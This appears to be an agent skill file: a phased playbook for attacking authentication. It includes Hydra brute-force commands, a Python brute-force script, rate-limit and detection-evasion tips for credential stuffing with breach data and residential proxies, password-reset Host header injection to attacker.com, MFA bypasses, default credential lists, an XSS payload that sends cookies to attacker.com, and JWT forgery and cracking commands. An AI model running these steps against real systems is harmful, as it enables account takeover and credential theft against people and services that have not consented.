---
name: auth_attacks
description: Authentication and session attack patterns for credential compromise
---

# Authentication Attack Patterns

## Phase 1: Credential Brute-Force

### Hydra — Network Service Brute-Force

```bash
# SSH brute-force
hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://<target-ip> -t 4

# HTTP POST form
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target-ip> http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" -t 10

# HTTP Basic Auth
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target-ip> http-get /admin

# FTP
hydra -L users.txt -P passwords.txt ftp://<target-ip>
```

### Custom Brute-Force Script Pattern

```python
import httpx, asyncio

async def brute_force(url, username, passwords):
    async with httpx.AsyncClient() as client:
        for pwd in passwords:
            resp = await client.post(url, data={"user": username, "pass": pwd})
            if "Invalid" not in resp.text:
                return (username, pwd)
            await asyncio.sleep(0.1)  # Rate limiting
    return None
```

### Rate-Limit Bypass Techniques

```
1. Rotate X-Forwarded-For header per attempt
2. Distribute across multiple source IPs
3. Add random delays between requests
4. Switch between login endpoints if multiple exist (/login, /api/auth, /signin)
5. Use case variations in username (Admin, ADMIN, admin)
```

## Phase 2: Credential Stuffing

### Approach

```
1. Obtain breach databases relevant to the target domain
2. Extract email:password pairs for <target-domain>
3. Normalize: lowercase emails, deduplicate
4. Spray against target login endpoint
5. Monitor for successful logins vs lockouts
```

### Detection Evasion

```
- Limit to 1 attempt per account per hour
- Randomize user-agent per request
- Use residential proxies for source IP diversity
- Avoid accounts that return "locked" or "suspended" responses
```

## Phase 3: Password Reset Flow Abuse

### Test Cases

```
1. HOST HEADER INJECTION
   POST /reset-password HTTP/1.1
   Host: attacker.com
   -> Does the reset link use attacker.com as the base URL?

2. IDOR IN RESET TOKEN
   GET /reset?token=<token>&user_id=<victim_id>
   -> Can you change user_id to another user after receiving your own token?

3. TOKEN PREDICTABILITY
   - Request multiple tokens, check for sequential patterns
   - Check token entropy (< 64 bits = potentially brute-forceable)
   - Test if expired tokens are still accepted

4. RESPONSE MANIPULATION
   - Intercept reset response, change {"success": false} to {"success": true}
   - Check if client-side validation is the only gate

5. RACE CONDITION
   - Send password reset and password change simultaneously
   - Test if token is invalidated before new password is set
```

## Phase 4: MFA Bypass Techniques

### Common Bypass Methods

```
1. DIRECT ENDPOINT ACCESS
   - After first factor, skip MFA page and navigate directly to /dashboard
   - Check if session is fully authenticated before MFA completion

2. BRUTE-FORCE OTP
   - 4-digit OTP = 10,000 combinations, often no rate limit
   - 6-digit with 3 attempts = not brute-forceable, try response manipulation

3. TOKEN REUSE
   - Use a valid OTP code from your account against another account
   - Test if OTP is bound to session or to user

4. BACKUP CODE ABUSE
   - Backup codes sometimes have weaker validation
   - Test: are codes single-use? Is there a rate limit?

5. MFA ENROLLMENT BYPASS
   - Register MFA on attacker-controlled device during account takeover
   - Check if MFA enrollment requires re-authentication
```

## Phase 5: Default Credential Testing

### Priority Checklist

```bash
# Test default credentials on discovered services
# Common defaults to try:
admin:admin         admin:password      admin:123456
root:root           root:toor           root:password
test:test           user:user           guest:guest
administrator:admin tomcat:tomcat       postgres:postgres
sa:sa               mysql:mysql         admin:changeme
```

### Service-Specific Defaults

```
Apache Tomcat:  tomcat:s3cret, admin:admin
Jenkins:        admin:<no password>, admin:password
MongoDB:        <no auth> on port 27017
Redis:          <no auth> on port 6379
Elasticsearch:  <no auth> on port 9200
phpMyAdmin:     root:<empty>, root:root
```

## Phase 6: Session Attacks

### Session Fixation

```
1. Obtain a valid session ID from the target
2. Force victim to use this session ID (via URL param or Set-Cookie)
3. Victim authenticates -> attacker's session is now authenticated
4. Test: Does the app regenerate session ID after login?
```

### Session Hijacking

```
1. XSS-based: Inject <script>fetch('https://attacker.com/c?='+document.cookie)</script>
2. Network sniffing: If cookies lack Secure flag and HTTP is available
3. Cookie attributes to check:
   - HttpOnly flag (prevents JS access)
   - Secure flag (HTTPS only)
   - SameSite attribute (CSRF protection)
   - Expiration (long-lived sessions = higher risk)
```

### JWT Attacks

```bash
# Decode JWT
echo "<token>" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq .

# Algorithm confusion: change alg to "none"
# Algorithm switch: RS256 -> HS256 (sign with public key)
# Test: Does the server accept unsigned tokens?
# Test: Is the secret key weak? (hashcat -m 16500 jwt.txt wordlist.txt)
```

## Decision Tree

```
1. Login form found?
   YES -> Test default creds, then brute-force with rate-limit awareness
   NO  -> Check for API auth endpoints, OAuth flows

2. MFA enabled?
   YES -> Test bypass methods before brute-force
   NO  -> Proceed directly to credential attacks

3. Password reset available?
   YES -> Test host header injection, token predictability, IDOR
   NO  -> Focus on session-based attacks

4. JWT in use?
   YES -> Test alg:none, weak secret, claim manipulation
   NO  -> Test session cookie attributes and fixation
```
